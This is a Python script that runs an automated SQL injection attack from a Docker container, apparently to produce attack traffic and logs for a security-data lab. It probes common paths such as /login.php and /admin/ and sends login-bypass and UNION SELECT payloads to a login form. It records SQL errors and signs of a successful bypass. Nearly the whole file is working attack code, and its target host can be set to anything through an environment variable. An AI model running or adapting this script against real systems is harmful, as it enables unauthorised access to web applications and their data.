#!/usr/bin/env python3
"""
Container-based SQL Injection Attack Script
Runs inside attacker container for better data collection
"""

import requests
import time
import random
import json
import os
from urllib.parse import urljoin
from datetime import datetime

# Container-specific configuration
TARGET_HOST = os.getenv('TARGET_HOST', 'victim-web')
TARGET_PORT = os.getenv('TARGET_PORT', '80')
ATTACK_TYPE = os.getenv('ATTACK_TYPE', 'sql_injection')
ATTACK_PHASE = os.getenv('ATTACK_PHASE', 'automated')

BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"
LOG_FILE = "/opt/output/container_attack_log.json"

class ContainerAttacker:
    """Container-based SQL injection attacker"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Container-Attacker/1.0',
            'X-Attacker-ID': 'attacker-001',
            'X-Attack-Type': ATTACK_TYPE
        })
        self.attack_results = []
        
    def log_attack_event(self, event_type, details):
        """Log attack events with container metadata"""
        event = {
            'timestamp': datetime.now().isoformat(),
            'container_id': os.getenv('HOSTNAME', 'attacker'),
            'attack_type': ATTACK_TYPE,
            'attack_phase': ATTACK_PHASE,
            'event_type': event_type,
            'target_host': TARGET_HOST,
            'details': details
        }
        print(f"[CONTAINER] {event_type}: {details}")
        return event
    
    def test_connectivity(self):
        """Test connectivity to target"""
        print("=== Testing Container Connectivity ===")
        
        try:
            response = self.session.get(BASE_URL, timeout=5)
            if response.status_code == 200:
                print(f"[+] Successfully connected to {BASE_URL}")
                self.log_attack_event('connectivity_test', {
                    'status': 'success',
                    'status_code': response.status_code
                })
                return True
            else:
                print(f"[-] Connection failed: {response.status_code}")
                return False
        except Exception as e:
            print(f"[-] Connection error: {e}")
            return False
    
    def reconnaissance_phase(self):
        """Container-based reconnaissance"""
        print("\n=== Container Reconnaissance Phase ===")
        
        recon_events = []
        common_paths = ['/', '/login.php', '/search.php', '/admin/']
        
        for path in common_paths:
            url = urljoin(BASE_URL, path)
            try:
                response = self.session.get(url, timeout=5)
                event = self.log_attack_event('reconnaissance', {
                    'path': path,
                    'status_code': response.status_code,
                    'response_length': len(response.text)
                })
                recon_events.append(event)
                
                print(f"[+] {path}: {response.status_code} ({len(response.text)} chars)")
                
            except Exception as e:
                print(f"[-] Error scanning {path}: {e}")
            
            time.sleep(random.uniform(1, 2))
        
        return recon_events
    
    def sql_injection_phase(self):
        """Container-based SQL injection attacks"""
        print("\n=== Container SQL Injection Phase ===")
        
        # Login injection payloads
        login_payloads = [
            ("admin' --", "test"),
            ("admin' OR '1'='1", "test"),
            ("' OR 1=1--", "test"),
            ("' UNION SELECT 1,2,3--", "test"),
        ]
        
        for i, (user_payload, pass_payload) in enumerate(login_payloads, 1):
            print(f"\n[+] Container Attack {i}: {user_payload}")
            
            params = {
                'user': user_payload,
                'pass': pass_payload
            }
            
            try:
                start_time = time.time()
                response = self.session.get(
                    urljoin(BASE_URL, "/login.php"),
                    params=params,
                    timeout=10
                )
                response_time = time.time() - start_time
                
                result = {
                    'type': 'container_login_injection',
                    'payload': user_payload,
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'response_time': response_time,
                    'timestamp': datetime.now().isoformat(),
                    'container_metadata': {
                        'attacker_id': os.getenv('HOSTNAME', 'attacker'),
                        'attack_type': ATTACK_TYPE,
                        'target_host': TARGET_HOST
                    }
                }
                
                # Analyze response
                content = response.text.lower()
                if 'sql' in content or 'database' in content:
                    result['sql_error'] = True
                    print(f"    [!] SQL error detected!")
                
                if 'welcome' in content or 'dashboard' in content:
                    result['success'] = True
                    print(f"    [!] Possible successful login!")
                
                print(f"    Status: {response.status_code}, Length: {len(response.text)}, Time: {response_time:.2f}s")
                self.attack_results.append(result)
                
                # Log attack event
                self.log_attack_event('sql_injection_attempt', {
                    'payload': user_payload,
                    'target': 'login.php',
                    'success': result.get('success', False),
                    'sql_error': result.get('sql_error', False)
                })
                
            except Exception as e:
                print(f"    Error: {e}")
            
            # Container-specific delay
            delay = random.uniform(3, 6)
            print(f"    Waiting {delay:.1f} seconds...")
            time.sleep(delay)
    
    def save_container_log(self):
        """Save container-specific attack log"""
        log_data = {
            'container_attack_timestamp': datetime.now().isoformat(),
            'container_id': os.getenv('HOSTNAME', 'attacker'),
            'target_url': BASE_URL,
            'attack_type': ATTACK_TYPE,
            'attack_phase': ATTACK_PHASE,
            'results': self.attack_results
        }
        
        with open(LOG_FILE, 'w') as f:
            json.dump(log_data, f, indent=2)
        
        print(f"\n[+] Container attack log saved to: {LOG_FILE}")

def main():
    """Main container attack orchestration"""
    print("🚀 Starting Container-based SQL Injection Attack")
    print(f"Container ID: {os.getenv('HOSTNAME', 'attacker')}")
    print(f"Target: {BASE_URL}")
    print(f"Attack Type: {ATTACK_TYPE}")
    print("=" * 60)
    
    attacker = ContainerAttacker()
    
    try:
        # Test connectivity
        if not attacker.test_connectivity():
            print("❌ Cannot connect to target, exiting...")
            return
        
        # Reconnaissance phase
        recon_events = attacker.reconnaissance_phase()
        
        # SQL injection phase
        attacker.sql_injection_phase()
        
        # Save results
        attacker.save_container_log()
        
        print("\n✅ Container attack completed!")
        print("Check the following for container data:")
        print("- Container logs: docker logs securitylogs-attacker")
        print("- Attack log: /opt/output/container_attack_log.json")
        print("- Network traffic: data/pcap/")
        
    except KeyboardInterrupt:
        print("\n⏹️  Container attack interrupted")
    except Exception as e:
        print(f"\n❌ Container attack failed: {e}")

if __name__ == "__main__":
    main() 